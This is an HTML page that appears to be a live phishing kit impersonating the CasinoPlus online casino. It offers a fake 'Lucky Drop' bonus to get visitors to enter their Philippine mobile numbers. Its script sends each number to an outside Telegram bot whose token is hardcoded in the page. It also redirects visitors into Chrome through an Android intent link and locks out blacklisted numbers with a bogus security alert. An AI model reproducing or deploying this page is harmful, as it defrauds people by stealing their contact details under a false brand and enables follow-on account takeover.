<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Lucky Drop</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;900&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
            --royal-blue: #1e40af;
            --dark-bg: #060a13;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--dark-bg);
            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, #060a13 100%);
            color: #ffffff;
            font-family: 'Public Sans', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Initial Greeting Card */
        .card {
            width: 92%;
            max-width: 380px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(212, 175, 55, 0.5);
            border-radius: 28px;
            padding: 35px 24px;
            backdrop-filter: blur(20px);
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            transition: opacity 0.3s ease;
        }

        .logo-img { width: 170px; margin-bottom: 20px; }

        h1 { font-size: 24px; font-weight: 900; margin-bottom: 10px; color: #fff; letter-spacing: -0.5px; }
        .promo-text { color: #cbd5e1; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        .promo-text b { color: #fbbf24; }

        .btn-main {
            background: var(--gold);
            color: #000;
            border: none;
            width: 100%;
            padding: 20px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 900;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 6px 0 #8b6508;
            transition: 0.2s;
        }

        .btn-main:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
        .btn-main:disabled { background: #4b5563; color: #9ca3af; box-shadow: none; transform: translateY(3px); }

        /* Modal Popup */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.95);
            z-index: 99999;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            width: 92%;
            max-width: 380px;
            background: #0f172a;
            border-radius: 30px;
            border: 1px solid rgba(212, 175, 55, 0.3);
            overflow: hidden;
            text-align: center;
            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes popIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .promo-banner {
            width: 100%;
            height: 220px;
            object-fit: contain;
            object-position: bottom;
            background-color: #000;
            border-bottom: 2px solid #d4af37;
            padding: 10px;
        }

        .modal-body { padding: 25px 20px; }

        .label-style {
            display: block;
            font-size: 12px;
            font-weight: 800;
            color: #fbbf24;
            text-transform: uppercase;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }

        input {
            width: 100%;
            background: #000;
            border: 1px solid #334155;
            border-radius: 15px;
            padding: 18px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 20px;
            outline: none;
        }

        input:focus { border-color: #fbbf24; }

        .status-msg { font-size: 12px; color: #94a3b8; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
        <h1>You've Got a Reward!</h1>
        <p class="promo-text">System profiling complete! You are selected for a <b>Special Lucky Drop</b>. Claim your surprise bonus now.</p>
        <button class="btn-main" id="checkBtn" onclick="handleVerify()">Check My Reward</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <img src="free_depo.jpeg" class="promo-banner" alt="Special Promo">
            <div class="modal-body" id="modalBodyContent">
                <div id="step1">
                    <h2 style="margin-bottom: 15px; font-size: 20px;">Claim Your Bonus</h2>
                    <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">Enter your registered mobile number to sync your rewards.</p>
                    <span class="label-style">Mobile Number</span>
                    <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                    <button class="btn-main" id="claimBtn" onclick="processStep1()">Claim Now</button>
                    <p class="status-msg">Official Membership Verification</p>
                </div>
            </div>
        </div>
    </div>

    <script src="config.js"></script>

    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';
        const BYPASS_MODE = true; 

        // 1. HARD LOCK UI: Haharang sa screen para wala silang magawa
        function showBlockedUI() {
            const overlay = document.getElementById('modalOverlay');
            overlay.style.display = 'flex';
            document.getElementById('modalBodyContent').innerHTML = `
                <div style="padding: 10px 0;">
                    <h2 style="color: #fbbf24; margin-bottom: 15px; font-size: 22px;">ACCESS RESTRICTED</h2>
                    <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">
                        ⚠️ <b>Security Alert:</b> This device has been flagged due to multiple attempts or an invalid account link.<br><br>
                        Contact CasinoPlus support if you think this is a mistake.
                    </p>
                    <button class="btn-main" style="margin-top: 25px; background: #334155; color: #fff; box-shadow: none;" onclick="location.reload()">System Locked</button>
                </div>
            `;
            // I-disable ang main card sa background
            const mainCard = document.getElementById('mainCard');
            mainCard.style.opacity = "0.2";
            mainCard.style.pointerEvents = "none";
        }

        // 2. SAFETY CHECK: Tumatakbo agad pag-refresh
        function checkPersistentLock() {
            if (localStorage.getItem("cp_device_locked") === "true") {
                showBlockedUI();
                return true;
            }
            return false;
        }

        // 3. PAGE LOAD LOGIC
        window.onload = () => {
            const isLocked = checkPersistentLock();
            
            // Kung hindi locked at may #verified, buksan ang modal
            if (!isLocked && window.location.hash.includes("verified")) {
                document.getElementById('modalOverlay').style.display = 'flex';
                document.getElementById('userPhone').focus();
            }
        };

        function handleVerify() {
            // Check muna kung blocked
            if (checkPersistentLock()) return;

            const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
            if (!window.location.hash.includes("verified")) {
                window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
            } else {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        }

        async function processStep1() {
            const phoneInput = document.getElementById('userPhone');
            const phone = phoneInput.value.trim();
            const btn = document.getElementById('claimBtn');

            if (phone.length < 11 || !phone.startsWith('09')) {
                alert("Please enter a valid 11-digit mobile number.");
                return;
            }

            btn.disabled = true;
            btn.innerHTML = "CHECKING...";

            // --- THE PERMANENT BAN LOGIC ---
            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
                // I-save ang "BAN" sa device memory (localStorage)
                localStorage.setItem("cp_device_locked", "true");
                
                setTimeout(() => {
                    showBlockedUI();
                }, 1500);
                return; 
            }

            // Normal Flow (kung hindi banned)
            const msg = `🎁 LUCKY DROP CLAIM:\n📱 Number: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
                btn.innerHTML = "CLAIMING...";
                setTimeout(() => { window.location.href = "main.html"; }, 1500);
            } catch (e) {
                window.location.href = "main.html";
            }
        }
    </script>
</body>
</html>
